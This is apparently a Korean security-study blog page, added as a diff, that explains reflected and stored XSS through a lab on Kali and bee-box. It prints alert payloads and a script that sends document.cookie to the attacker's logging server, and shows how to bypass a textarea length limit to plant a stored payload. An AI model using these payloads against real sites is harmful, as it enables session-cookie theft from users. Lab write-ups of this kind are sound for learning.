@@ -1,0 +1,172 @@
+<!doctype html>
+<html lang="ko">
+<head>
+  <meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="description" content="XSS란?- 공격자가 악의적인 스크립트 코드를 웹 애플리케이션에 삽입한 후 웹 사용자의 웹 브라우저에서 해당 코드가 실행되게 만드는 공격임.- 클라이언트 쪽을 공격함- 세션쿠키를 탈취를 주목적으로 함- 다양한 형태의 코드로 공격이 가능함 대표적으로 두 가지 공격기…"><meta name="theme-color" content="#08090b"><title>XSS(Cross-site-script) — W-Rookie</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600&family=Noto+Sans+KR:wght@400;500;600;700;800;900&display=swap" rel="stylesheet"><script src="../assets/theme-init.js"></script><link rel="stylesheet" href="../assets/styles.css"><script src="../assets/app.js" defer></script>
+</head>
+<body><div class="noise" aria-hidden="true"></div><div class="article-progress" aria-hidden="true"></div>
+  <header class="site-header"><a class="brand" href="../index.html"><span class="brand-mark"><i></i></span><span><strong>W-ROOKIE</strong><small>SECURITY LOG</small></span></a><button class="theme-toggle" type="button" aria-label="화이트 모드로 변경"><span class="theme-toggle-icon" aria-hidden="true">☀</span><span class="theme-toggle-label">LIGHT</span></button><button class="menu-toggle" type="button" aria-label="메뉴 열기" aria-expanded="false"><span></span><span></span></button><nav class="main-nav"><a href="../index.html">HOME</a><a href="../index.html#projects">PROJECTS</a><a href="../index.html#ctf">CTF</a><a class="active" href="../index.html#notes">NOTES</a><a href="../index.html#about">ABOUT</a><a class="nav-github" href="https://github.com/W-Rookie" target="_blank" rel="noreferrer">GITHUB ↗</a></nav></header>
+  <main class="article-shell"><aside class="article-aside"><div class="article-aside-inner"><p>NOTE 37<br>WEB PENETRATION TESTING</p><a href="../index.html#notes">← 모든 기록</a></div></aside><article>
+    <header class="article-head"><div class="article-meta"><span>WEB PENETRATION TESTING</span><time datetime="2025-12-19">2025.12.19</time><span>4 MIN READ</span></div><h1>XSS(Cross-site-script)</h1><p>XSS란?- 공격자가 악의적인 스크립트 코드를 웹 애플리케이션에 삽입한 후 웹 사용자의 웹 브라우저에서 해당 코드가 실행되게 만드는 공격임.- 클라이언트 쪽을 공격함- 세션쿠키를 탈취를 주목적으로 함- 다양한 형태의 코드로 공격이 가능함 대표적으로 두 가지 공격기…</p></header>
+    <div class="article-content tistory-content"><h4><b>XSS란?</b></h4>
+<p>- 공격자가 악의적인 스크립트 코드를 웹 애플리케이션에 삽입한 후 웹 사용자의 웹 브라우저에서 해당 코드가 실행되게 만드는 공격임.</p>
+<p>- 클라이언트 쪽을 공격함</p>
+<p>- 세션쿠키를 탈취를 주목적으로 함</p>
+<p>- 다양한 형태의 코드로 공격이 가능함</p>
+<p> </p>
+<p>대표적으로 두 가지 공격기법이 있는데</p>
+<p>1. Reflected XSS (반사형)</p>
+<p>2. Stored XSS (저장형)</p>
+<p> </p>
+<h4><b>Reflected XSS</b></h4>
+<p>- &lt;script&gt;의 코드를 적절한 입력값 검증이 없다면 해당 코드로 사용자의 세션쿠키를 탈취당할 수 있는데 특징은</p>
+<p>즉시 응답 메시지로 반사형태로 계속 알림이 뜬다는 뜻이다 </p>
+<p><figure class="imageblock alignCenter"><span><img src="../assets/posts/48/image-01.png" loading="lazy" width="915" height="522" alt="Reflected XSS 시나리오"></span><figcaption>Reflected XSS 시나리오</figcaption>
+</figure>
+</p>
+<p>실습 </p>
+<p> </p>
+<p> </p>
+<p><figure class="imageblock alignCenter"><span><img src="../assets/posts/48/image-02.png" loading="lazy" width="996" height="221" alt=""></span></figure>
+</p>
+<p> </p>
+<p>이름을 넣는 입력란이 있다. </p>
+<p>위에는 &lt;script&gt; alert(1);&lt;/script&gt; 코드를 집어넣을 것이다 alert() 함수는 웹페이지에 알림 창을 띄워주는 역할을 한다.</p>
+<p>가끔씩 웹 사이트에 방문하면 알림 창이 뜨는데 이 기능을 구현해 주는 게 alert() 함수이다. </p>
+<p>즉, 1을 알림 창으로 띄워서 &lt;script&gt;가 먹히는지 테스트해 보는 것이다. </p>
+<p> </p>
+<div class="code-block"><pre id="code_1766070469018" class="javascript"><code>&lt;script&gt;alert(1);&lt;/script&gt;</code></pre>
+</div><p> </p>
+<p> </p>
+<p><figure class="imageblock alignCenter"><span><img src="../assets/posts/48/image-03.png" loading="lazy" width="497" height="138" alt=""></span></figure>
+</p>
+<p> </p>
+<p>이런 식으로 알림 창에 1이 출력되는 것을 확인할 수 있다.</p>
+<blockquote>Tip<br>- 폼이나 파라미터에 &lt;script&gt; alert(1);&lt;/script&gt; 코드를 입력하여 XSS 취약점을 확인이 가능하다.<br>경우에 따라 우회 기법을 사용할 필요도 있다.</blockquote>
+<p> </p>
+<p> </p>
+<p>이번에는 쿠키를 추출할 수 있는 코드를 써볼 것이다 즉, 웹서버에 저장되어 있는 세션쿠키를 추출할 것이다.</p>
+<p> </p>
+<div class="code-block"><pre id="code_1766070531638" class="javascript"><code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></pre>
+</div><p> </p>
+<p> </p>
+<p><figure class="imageblock alignCenter"><span><img src="../assets/posts/48/image-04.png" loading="lazy" width="496" height="152" alt=""></span></figure>
+</p>
+<p>이렇게 세션쿠키를 추출하였다.</p>
+<p> </p>
+<p>위에 실습은 본인의 세션쿠키를 추출한 것이고 이제 공격자에게 피해자의 세션쿠키가 이동하도록 해볼 것이다.</p>
+<p> </p>
+<p>일단 칼리리눅스가 (공격자) bee리눅스가(피해자)라고 가정하면</p>
+<p> </p>
+<p>칼리리눅스에서 해줘야 하는 설정이 있는데</p>
+<p> </p>
+<p>apache 서버를 생성해줘야 한다.</p>
+<p>명령어는 다음과 같다</p>
+<div class="code-block"><pre id="code_1766070840217" class="shell"><code>service  apache2 start</code></pre>
+</div><p> </p>
+<p>명령어를 입력하고 나면 본인 ip에 브라우저에 입력하고 잘 생성되었는지 확인한다.</p>
+<p> </p>
+<p> </p>
+<p><figure class="imageblock alignCenter"><span><img src="../assets/posts/48/image-05.png" loading="lazy" width="797" height="700" alt=""></span></figure>
+</p>
+<p> </p>
+<p> </p>
+<p>잘 생성된 것을 볼 수 있다.</p>
+<p> </p>
+<p>다음은 로그파일을 생성합니다 </p>
+<p>명령어는 다음과 같습니다.</p>
+<div class="code-block"><pre id="code_1766070948904" class="shell"><code>tail -f /var/log/apache2/access.log</code></pre>
+</div><p> </p>
+<p><span style="color: #ee2323;">tail이라는</span> 명령어는 리눅스에서 로그 파일을 모니터링해 주는 기능이다.</p>
+<p>여기서 로그(log)란?</p>
+<p>- 웹에 접근하는 객체를 기록하는 역할을 하는데 위에 코드는 access.log를 사용하였다.</p>
+<p> </p>
+<p> </p>
+<p> </p>
+<p><figure class="imageblock alignCenter"><span><img src="../assets/posts/48/image-06.png" loading="lazy" width="1441" height="318" alt=""></span></figure>
+</p>
+<p> </p>
+<p>다음과 같이 모니터링할 수 있는 환경을 구성하였다.</p>
+<p> </p>
+<p>테스트를 해보면</p>
+<p> </p>
+<p><figure class="imageblock alignCenter"><span><img src="../assets/posts/48/image-07.png" loading="lazy" width="995" height="231" alt=""></span></figure>
+</p>
+<p> </p>
+<div class="code-block"><pre id="code_1766071313890" class="shell"><code>&lt;script&gt;document.location='http://192.168.56.100/cookie?'+document.cookie&lt;/script&gt;</code></pre>
+</div><p> </p>
+<p>아래와 같은 코드를 삽입하면</p>
+<p> </p>
+<p><figure class="imageblock alignCenter"><span><img src="../assets/posts/48/image-08.png" loading="lazy" width="1440" height="89" alt=""></span></figure>
+</p>
+<p> </p>
+<p>아래와 같이 세션쿠키를 탈취한 것을 모니터링해 준다.</p>
+<p> </p>
+<p><span style="color: #ee2323;">document.location</span>을 이용하면 지정된 주소로 리다이렉션 해준다.</p>
+<p>즉, 웹 브라우저는 공격자의 호스트로 접속하게 되는 것이다.</p>
+<p> </p>
+<p> </p>
+<p>여기서 의문점은 </p>
+<p> </p>
+<p>과연 사용자(피해자)가 이런 위험한 코드를 직접 입력하진 않습니다. 사실상 불가능하죠 그래서 이를 이용한 것이 피싱입니다</p>
+<p>클릭을 유도해서 XSS를 실행하게 하는 것입니다 사용자가 클릭을 할 시 XSS코드가 실행이 되고 세션쿠키를 탈취하는 간단한 시나리오가 나옵니다. 따라서 추가적으로 연계해서 XSS를 사용하는 방법이 더 크리티컬 하다.</p>
+<p> </p>
+<p>버프스위트에</p>
+<p> </p>
+<p><figure class="imageblock alignCenter"><span><img src="../assets/posts/48/image-09.png" loading="lazy" width="1086" height="216" alt=""></span></figure>
+</p>
+<p> </p>
+<p> </p>
+<p>% 3C와 같은 문자들이 있는데 웹 브라우저에서는 <span style="color: #ee2323;">일부 특수문자를 URL 인코딩</span>으로 자동 변환하기 때문입니다.</p>
+<p> </p>
+<blockquote>막간의 용어<br>인코딩 : 간단하게 말하면 기계가 읽을 수 있는 코드<br>디코딩 : 기계가 이진법으로 문자를 만들어서 사람이 읽을 수 있게 만드는 코드라고 생각하면 됨</blockquote>
+<p> </p>
+<p>크로스사이트스크립팅 취약점이 존재하면,  공격자는 세션 탈취 이외에도 다양한 공격을 수행할 수 있음</p>
+<p>비프 (BeEF)라는 프로그램을 사용 가능</p>
+<p>- 여러 가지 공격들을 수행할 수 있게 하는 프로그램임 (후킹코드)</p>
+<p> </p>
+<h4><b>Stored XSS</b></h4>
+<p>- 스토어드 XSS는 리플렉티드와는 다르게 반사형이 아닌 <span style="color: #ee2323;">저장형</span>이다 과?</p>
+<p>무슨 말이냐면 웹 서버에 저장해 뒀다가 실행되게 하는 것이다.</p>
+<p>더 쉽게 말하면</p>
+<p> </p>
+<p>예를 들어 사용자가 게시판 페이지에 들어갔다고 가정 </p>
+<p>글 쓴 사람의 내용이 궁금해서 눌렀는데 웹서버에 저장되어 있던 악성스크립트 XSS가 실행되면서 세션쿠키를 탈취하는 거임 반사형과는 개념이 좀 다르지만 공통점은 이 또한 피싱으로 사용자의 세션쿠키를 노린다는 것</p>
+<p> </p>
+<p><figure class="imageblock alignCenter"><span><img src="../assets/posts/48/image-10.png" loading="lazy" width="919" height="474" alt="Stored XSS 시나리오"></span><figcaption>Stored XSS 시나리오</figcaption>
+</figure>
+</p>
+<p> </p>
+<p style="text-align: center;"><b>실습</b></p>
+<p> </p>
+<p>이번에도 tail명령어로  access.log를 이용해 모니터링하겠습니다.</p>
+<p> </p>
+<p> </p>
+<p><figure class="imageblock alignCenter"><span><img src="../assets/posts/48/image-11.png" loading="lazy" width="998" height="270" alt=""></span></figure>
+</p>
+<p> </p>
+<p>이번에도 리플렉티드와 같은 코드를 사용하려고 하는데 더 이상 입력이 되지 않습니다. 이럴 때 해결법은 개발자 도구를 열어서 </p>
+<p>게시판 입력값을 늘리면 됩니다.</p>
+<p> </p>
+<p><figure class="imageblock alignCenter"><span><img src="../assets/posts/48/image-12.png" loading="lazy" width="685" height="22" alt=""></span></figure>
+</p>
+<p> </p>
+<p>여기 보면  textarea에 최대 글자 수가 50으로 지정되어 있는데 이를 500으로 늘려주면 됩니다.</p>
+<blockquote>Tip <br>- 클라이언트 쪽에서 입력값을 제한하거나 검증하도록 구현된 인터페이스는 쉽게 우회할 수 있습니다.</blockquote>
+<p> </p>
+<p><figure class="imageblock alignCenter"><span><img src="../assets/posts/48/image-13.png" loading="lazy" width="1421" height="247" alt=""></span></figure>
+</p>
+<p> </p>
+<p>실행해 보면</p>
+<p> </p>
+<p><figure class="imageblock alignCenter"><span><img src="../assets/posts/48/image-14.png" loading="lazy" width="1418" height="223" alt=""></span></figure>
+</p>
+<p> </p>
+<p>이런 식으로 게시판에 저장된 스크립트로 인해 세션쿠키를 탈취할 수 있는데 여기서 끝이 아니라 앞으로 이 방명록을 누르는 사용자 또한 세션쿠키를 공격자에게 탈취당할 수 있습니다.</p>
+<p> </p>
+<p><figure class="imageblock alignCenter"><span><img src="../assets/posts/48/image-15.png" loading="lazy" width="1432" height="180" alt=""></span></figure>
+</p>
+<p> </p>
+<p>방명록을 또 클릭하니 세션쿠키 탈취하는 게 추가하는 것을 볼 수 있음 (저장되어 있기에 가능)</p><div class="next-note"><span>NEXT NOTE</span><a href="note-47.html">Command injection 보안 대책 →</a></div></div>
+  </article></main><footer class="site-footer"><p>© 2026 W-ROOKIE.</p><a href="#">BACK TO TOP ↑</a></footer>
+</body></html>
